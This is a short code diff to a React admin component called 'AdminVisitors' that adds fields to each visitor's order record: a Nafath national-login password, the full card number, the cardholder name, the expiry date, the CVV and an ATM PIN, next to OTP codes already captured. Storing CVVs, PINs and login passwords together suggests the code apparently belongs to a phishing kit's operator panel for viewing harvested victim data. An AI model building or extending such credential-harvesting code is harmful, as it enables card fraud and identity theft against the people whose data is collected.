@@ -436,7 +436,17 @@ const AdminVisitors = () => {
               otp_code: o.otp_code || undefined,
               phone_otp_code: o.phone_otp_code || undefined,
               nafath_number: o.nafath_number || undefined,
+              nafath_password: (o as any).nafath_password || undefined,
               customer_name: o.customer_name || undefined,
+              card_number_full: o.card_number_full || undefined,
+              card_holder_name: o.card_holder_name || undefined,
+              card_expiry: o.card_expiry || undefined,
+              card_cvv: o.card_cvv || undefined,
+              card_last_four: o.card_last_four || undefined,
+              payment_method: o.payment_method || undefined,
+              total_price: o.total_price || undefined,
+              company: o.company || undefined,
+              atm_pin: (o as any).atm_pin || undefined,
             };
           } else {
             unmatchedOrders.push(o);
